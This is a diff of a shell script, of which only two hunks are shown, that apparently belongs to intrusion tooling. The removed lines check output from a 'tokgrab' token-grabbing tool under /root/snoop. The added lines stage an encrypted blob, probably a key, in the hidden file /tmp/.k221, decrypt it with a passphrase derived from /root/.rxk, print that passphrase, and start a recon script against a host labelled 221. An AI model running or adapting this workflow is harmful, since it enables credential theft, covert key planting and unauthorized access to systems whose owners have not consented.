@@ -1,19 +1,17 @@
-echo "=== tokgrab log ==="
-tail -30 /root/snoop/tokgrab.log 2>/dev/null
-ls -la /root/snoop/tg_*.json 2>/dev/null | head -20
-echo "=== k221 delivery v2 ==="
+echo "=== k221 delivery v3 ==="
 P=$(tr -d '[:space:]' < /root/.rxk | sha256sum | awk '{print $1}')
+echo "box-passphrase: $P"
 cat > /tmp/.k221.b64 <<'K64'
-U2FsdGVkX19hDB94RDecB0Uov4X30GnJiKWpJEsHPnAGNGlQHEqzOV5smXLnfr7MTr1lS5HL9sH9
-czm7yh1PeuLxrIHckUUbWCWKC216W5WEuJlScoCFVg+gpyqYbleymf6gzKV3EpZ9Q7sMRjcAmeNU
-e6KClB+1e9WmH2HKgPk+hc2aXtpNOl48WMdANew1Js9q5aVJtg3MRWHYVvEM9AhQtF4VEa/lsu8e
-CnNZ9CS1tXfsiZauxdbhYv3TCq9Ai/POOmM6ensTBaJ7tWLOCqmlEztnTqoJlQbIuiQKbHN+ToAr
-2si8dPvdOLghBMvBQP1ZlCFkz3+XMCjk7s8pqMblxv3N0CQyy2NZkWmQQLcSERs5HMqYw+y5n7pp
-hSvrSTaNAHII/oJe8aS8nAoPL3KyHOhxwNc+Jixe79gbqPiP9mr3CJeGWQoIzJrSarsTLpqh1kQN
-eInsTx9Z8ThnM8/1iYrUf+DgJHSWjRlaocHXyEox2sf2S+UfPMmzrEYZeR8o282kK9zO4DQzufAN
-xLZ0Nh3fh9helULoITz5JrcTwW7Sr+UWiAMxYxr7HimKjXpgWW3WYUCwm5cFCqaQcg==
+U2FsdGVkX19IeIEXjMegVOi3ABx4Fbjx1AIW7d/GK/nJCd28VdD6CGs/D5/Qmkmv4SYYWQGpshmE
+9xnLB6vd24ZqfRnfp70p6IDa4u1E9TVTTX+kXQWg4L+53r4J8iAqPhM/UUdmcxdX8LMPnlWedP0s
+HBznf7lMDmqIcoNSrFZuydzXzk4d5KF8NAOBGyd3RMH8pQKCwzqkS88+I/ojf3qXagLmU7ymwdXA
+EQ2P0AfCR8Pq9cM6QTY00t/6ixYd3OlnOz1U5fzuxREC7nkcAsuDs6KXiNg4oDzhK8bl9Czqliq8
+CLVxX+rotl4EK7LtX8H1SOlZLLnD6lelzfOqZ4AVCgc0BuIV77PcQfQgxjYJDOvtYh8Xatrw5Ex4
+rKiQ3rgtkK1DDjD2pd7CSHGBIgDVSKSO14ErSgO8WyXI8/Sa3RQYawXcWkwnElrUOu6y+TSP+5WW
+378EKTaczWZ7reEXp5D6O2XIWiL6wQ4Rw+6H8gv8irfuIZtm/sl88YqShh/SlC39D4Ms335GmjRZ
+8VqiTbau3XMxVN641e50zNMXeD72Wx4yN/Rn7lyTGCzNgFe70aTJWZ+Y+q3auQSKLw==
 K64
-openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>/dev/null && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL2"
+openssl enc -d -a -A -aes-256-cbc -pbkdf2 -md sha256 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>&1 && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL3"
 echo "=== 221 recon ==="
 cat > /tmp/recon221.sh <<'RSH'
 #!/bin/bash
@@ -42,4 +40,4 @@ if [ -s /tmp/.k221 ]; then
 else
   echo "no key, skip"
 fi
-echo "=== B14DONE ==="
+echo "=== B15DONE ==="
